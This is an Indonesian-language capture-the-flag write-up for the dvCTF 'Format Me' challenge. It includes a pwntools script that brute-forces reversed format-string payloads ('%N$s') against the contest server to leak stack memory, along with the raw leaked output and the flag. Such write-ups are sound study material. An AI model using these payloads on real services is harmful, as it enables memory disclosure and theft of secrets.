# Format Me
---
nc challs.dvc.tf 8888

# Solver
---
Tidak ada Attachment sama sekali. Yaudah connect dulu aja ```nc challs.dvc.tf 8888```. dari judulnya sih kelihatan bahwa ada celah format string dan apa yang kita inputkan akan di reverse dari hasil outputnya. Saya bikin program sederhana aja buat bruteforce nge leak flag yang ada menggunakan vuln format string jangan lupa payloadnya dibalik
```
from pwn import *
r = remote("challs.dvc.tf", 8888)
for i in range(3,200):
    try:
        payload = "%"+str(i)+"$s"
        r.recvuntil(":")
        r.sendline(payload[::-1])
        r.recvuntil("Result: \n")
        print(i,r.recvline())
    except Exception as e:
        r = remote("challs.dvc.tf", 8888)
        continue
```
yapsss flagnya bakal muncul hehehe
```
[+] Opening connection to challs.dvc.tf on port 8888: Done
3 b'\n'
4 b'@D#8\x04\x7f\n'
5 b'\xdf\x8e=\xae\xfc\x7f\n'
[+] Opening connection to challs.dvc.tf on port 8888: Done
[+] Opening connection to challs.dvc.tf on port 8888: Done
8 b'(null)\n'
9 b'(null)\n'
10 b'(null)\n'
11 b'(null)\n'
12 b'(null)\n'
[+] Opening connection to challs.dvc.tf on port 8888: Done
14 b'\n'
15 b'\n'
16 b'H\x85\xc0uTD9t$\x0cA\x8dV\x01v0A\x89\xd6\xb8\x02\n'
[+] Opening connection to challs.dvc.tf on port 8888: Done
18 b'H\x83\xc3\x01H9\xddu\xeaH\x83\xc4\x08[]A\\A]A^A_\xc3\x90f.\x0f\x1f\x84\n'
19 b'(null)\n'
20 b'(null)\n'
21 b'AWAVA\x89\xffAUATL\x8d%\xf6\x05 \n'
22 b'1\xedI\x89\xd1^H\x89\xe2H\x83\xe4\xf0PTI\xc7\xc0p\x08@\n'
23 b'\n'
24 b'dvCTF{1_h0p3_n01_s33s_th1s}\n'
25 b'AWAVA\x89\xffAUATL\x8d%\xf6\x05 \n'
26 b'\x89\xc7\xe8\x98V\x01\n'
[+] Opening connection to challs.dvc.tf on port 8888: Done
28 b'\xdf\xeeyd\xfe\x7f\n'
[+] Opening connection to challs.dvc.tf on port 8888: Done
30 b'UH\x89\xe5H\x81\xec\xa0\n'
31 b'(null)\n'
[+] Opening connection to challs.dvc.tf on port 8888: Done
33 b'1\xedI\x89\xd1^H\x89\xe2H\x83\xe4\xf0PTI\xc7\xc0p\x08@\n'
34 b'\n'
35 b'(null)\n'
36 b'(null)\n'

```
#### dvCTF{1_h0p3_n01_s33s_th1s}